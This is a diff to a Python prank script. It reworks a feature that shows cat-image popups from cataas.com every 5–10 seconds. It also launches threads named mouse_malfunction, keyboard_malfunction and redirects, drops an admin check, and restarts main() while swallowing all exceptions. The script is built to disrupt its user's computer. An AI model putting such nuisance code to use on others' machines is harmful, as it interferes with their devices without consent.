@@ -326,14 +326,12 @@ def keyboard_malfunction() -> Callable:
 # Feature 2 - Random popup windows, no idea how to do this yet...
 def funny_windows():
     """Make funny popup windows"""
-    import json
+    import json, io, PIL.ImageTk, PIL.Image
     from urllib.request import urlopen, Request
     import tkinter as tk
-    import PIL.ImageTk, PIL.ImageFile
-    import threading
 
-    url = 'https://cataas.com/cat?position=center&width=1000&height=1000&json=true'
-    req = Request(url, headers={'User-Agent': 'Mozilla/5.0'})
+    url = 'https://cataas.com/cat?type=square&position=center&width=1000&height=1000&json=true'
+
 
     root = tk.Tk()
     root.withdraw()  # Hide the root window
@@ -345,7 +343,8 @@ def funny_windows():
         if last_window['window'] is not None:
             last_window['window'].destroy()
 
-        response = json.loads(urlopen(req).read())
+        response = json.loads(urlopen(url).read().decode('utf-8'))
+        print(response)
         window = tk.Toplevel()
         window.resizable(False, False)
 
@@ -355,18 +354,24 @@ def funny_windows():
         window.protocol("WM_DELETE_WINDOW", on_close)
 
         image_content_url, mime_type = response['url'], response['mimetype'][6:]
+        print(f"Image URL: {image_content_url}, MIME Type: {mime_type}")
         image_data = urlopen(image_content_url).read()
-        parser = PIL.ImageFile.Parser()
-        parser.feed(image_data)
-        image = PIL.ImageTk.PhotoImage(parser.close(), format=mime_type)
+        print(f"Image data length: {len(image_data)} bytes")
+
+        image = PIL.Image.open(io.BytesIO(image_data))
+        image = PIL.ImageTk.PhotoImage(image, format=mime_type)
 
         canvas = tk.Canvas(window, width=image.width(), height=image.height())
         canvas.create_image(0, 0, image=image, anchor='nw')
         canvas.pack(padx=0, pady=0)
+
         window.title("Meow :3")
+        window.image = image
+        window.update()
+        last_window['window'] = window
 
         # Schedule next popup
-        delay = random.randint(60, 600) * 1000  # milliseconds
+        delay = random.randint(5, 10) * 1000  # milliseconds
         root.after(delay, show_cat)
 
     # Start the first popup
@@ -395,9 +400,14 @@ def main():
     threading.Thread(target=mouse_malfunction()).start()
     threading.Thread(target=keyboard_malfunction()).start()
     threading.Thread(target=redirects).start()
-    funny_windows()
+    threading.Thread(target=funny_windows).start()
+
 
 
 if __name__ == "__main__":
-    if is_admin():
-        main()
+    while True:
+        try:
+            main()
+            break
+        except: # catch everything who cares
+            pass
